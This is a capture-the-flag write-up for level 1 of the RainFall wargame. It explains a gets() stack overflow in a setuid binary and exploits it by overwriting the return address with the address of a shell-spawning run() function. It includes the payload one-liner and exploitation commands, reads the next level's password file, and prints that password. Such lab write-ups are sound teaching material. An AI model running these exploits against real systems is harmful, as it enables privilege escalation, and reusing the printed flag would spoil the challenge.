# RainFall - Level 1

## Keypass for level2
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

## Objective

Exploit the `level1` binary (setuid level2) in order to obtain a shell and read the file `/home/user/level2/.pass`.

---

## Binary Analysis

### Approximate Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void run(void)
{
    write(1, "Good... oh wait!\n", 17);
    execl("/bin/sh", "sh", NULL);
}

int main(void)
{
    char buff[76];

    gets(buff);
    return 0;
}
```

### Key Points

- A buffer of **76 bytes**
- `gets()` -> buffer overflow possible
- Presence of a `run()` function that spawns a shell (`/bin/sh`)
- No particular filter or protection (no canary, no blocking NX at this level)

### The Catch

The program reads user input into a fixed-size buffer without any length check.
It is therefore possible to overwrite the return address of `main` and redirect execution to the `run` function.

---

## Solution: Return to the `run` Function

### Idea

1. Find the address of the `run` function
2. Overwrite the return address with that address
3. The program jumps into `run` -> shell obtained

### Locating the Address of `run`

```bash
objdump -d level1 | grep -A5 "<run>"
```

or within GDB:

```gdb
disas run
```

Typical address:

```
0x08048444
```

(to be verified against the actual binary)

### Computing the Offset

- Buffer: 76 bytes
- Saved EBP: 4 bytes
- Return address: 4 bytes

-> **80 bytes** of padding before the return address.

---

## Building the Payload

```bash
python -c 'print "A"*80 + "\x44\x84\x04\x08"' > /tmp/payload
```

Replace `\x44\x84\x04\x08` with the real address of `run` in little-endian.

### Checking the Size

```bash
wc -c /tmp/payload
# should show 84
```

---

## Exploitation

```bash
(cat /tmp/payload; cat) | ./level1
```

Once the shell is obtained:

```bash
id
cat /home/user/level2/.pass
```

---

## Verification under GDB

```gdb
gdb ./level1
(gdb) b *main
(gdb) run < /tmp/payload
(gdb) disas run                  # confirm the address
(gdb) x/wx $ebp+4                # verify the return address was indeed overwritten
(gdb) c
```

---

## Technique Summary

| Step | Description |
|------|-------------|
| 1 | Buffer overflow via `gets` |
| 2 | 80 bytes of padding to reach the return address |
| 3 | Overwrite the return address with the address of `run` |
| 4 | The program jumps into `run` -> shell |

This technique is a **return to an existing function** (ret2text / ret2win).
